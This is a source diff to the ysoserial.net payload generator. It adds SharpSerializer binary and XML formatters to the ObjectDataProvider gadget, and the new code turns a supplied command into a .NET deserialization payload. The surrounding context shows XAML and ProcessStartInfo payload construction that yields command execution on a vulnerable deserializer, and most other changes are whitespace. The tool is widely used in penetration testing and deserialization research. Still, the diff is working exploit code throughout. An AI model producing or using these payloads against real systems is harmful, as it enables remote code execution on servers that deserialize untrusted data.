@@ -29,7 +29,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler" };
+            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml" };
         }
 
         public override OptionSet Options()
@@ -62,14 +62,14 @@ namespace ysoserial.Generators
         {
             return new List<string> { GadgetTypes.NotBridgeNotDerived };
         }
-        
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
             if (formatter.ToLower().Equals("xaml"))
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
-                
+
                 psi.FileName = inputArgs.CmdFileName;
                 if (inputArgs.HasArguments)
                 {
@@ -107,7 +107,7 @@ namespace ysoserial.Generators
                     // There are loads of other objects in Presentation that use XAML URLs and they can be used here instead
                     payload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + xaml_url + @"""/>";
 
-                    
+
                 }
                 else if (variant_number == 4)
                 {
@@ -121,7 +121,7 @@ namespace ysoserial.Generators
                     }
 
                     // There are loads of other objects in Presentation that use ResourceDictionary and they can all be used here instead
-                    payload = @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(bridge) + @"""/>"; 
+                    payload = @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(bridge) + @"""/>";
 
                 }
                 else
@@ -129,7 +129,7 @@ namespace ysoserial.Generators
                     //payload = XamlWriter.Save(odp);
                     payload = SerializersHelper.Xaml_serialize(odp);
                 }
-                
+
                 if (inputArgs.Minify)
                 {
                     // using discardable regex array to make it shorter!
@@ -165,7 +165,7 @@ namespace ysoserial.Generators
                         {
                             Debugging.ShowErrors(inputArgs, err);
                         }
-                    }   
+                    }
                 }
                 return payload;
             }
@@ -476,7 +476,7 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("yamldotnet"))
             {
                 inputArgs.CmdType = CommandArgSplitter.CommandType.YamlDotNet;
-                
+
                 String cmdPart;
 
                 if (inputArgs.HasArguments)
@@ -501,7 +501,7 @@ namespace ysoserial.Generators
                 }
         }
 }";
-                
+
                 if (inputArgs.Minify)
                 {
                     payload = YamlDocumentMinifier.Minify(payload);
@@ -523,7 +523,7 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("fspickler"))
             {
                 inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
-                
+
                 String cmdPart;
 
                 if (inputArgs.HasArguments)
@@ -593,6 +593,26 @@ namespace ysoserial.Generators
                     }
                 }
                 return payload;
+            }
+            else if (formatter.ToLowerInvariant().Equals("sharpserializerbinary"))
+            {
+                // Binary Serialization Mode
+                object serializedData = SerializersHelper.SharpSerializer_ObjectDataProvider_Binary_Serialize(inputArgs.Cmd);
+                if (inputArgs.Test)
+                {
+                    SerializersHelper.SharpSerializer_ObjectDataProvider_Binary_Deserialize(serializedData);
+                }
+                return serializedData;
+            }
+            else if (formatter.ToLowerInvariant().Equals("sharpserializerxml"))
+            {
+                // XML Serialization Mode
+                string serializedData = SerializersHelper.SharpSerializer_ObjectDataProvider_Xml_Serialize(inputArgs.Cmd);
+                if (inputArgs.Test)
+                {
+                    SerializersHelper.SharpSerializer_ObjectDataProvider_Xml_Deserialize(serializedData);
+                }
+                return serializedData;
             }
             else
             {
